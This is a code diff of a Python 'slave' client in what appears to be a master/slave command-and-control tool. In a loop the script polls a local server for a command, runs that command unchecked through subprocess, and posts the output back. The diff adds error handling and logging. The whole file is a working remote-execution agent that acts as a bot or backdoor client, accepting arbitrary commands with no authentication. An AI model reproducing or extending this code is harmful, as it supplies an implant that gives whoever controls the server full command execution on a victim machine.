@@ -8,7 +8,7 @@ master="user"
 slave="sot-pc"
 
 while True:
-	print('Trying to see if there is any command for me.')
+	print('\nChecking if there is any command for me.')
 	payload = {'slave_name': slave, 'master_name': master}
 	response = r.get('http://localhost:3000/slave_api', params=payload)
 	command = json.loads(response.content)[0].split(' ')
@@ -24,8 +24,13 @@ while True:
 
 	timestamp = json.loads(response.content)[1]
 
-	out = subprocess.check_output(command)
+	try:
+		out = subprocess.check_output(command)
+	except Exception as e:
+		out = e
 
 	payload_out = {'slave_name': slave, 'master_name':master , 'timestamp' : timestamp, 'out' : out}
 	r.post('http://localhost:3000/slave_api', params=payload_out)
+	
+	print('i ran command: ' + str(command))
 	time.sleep(20)
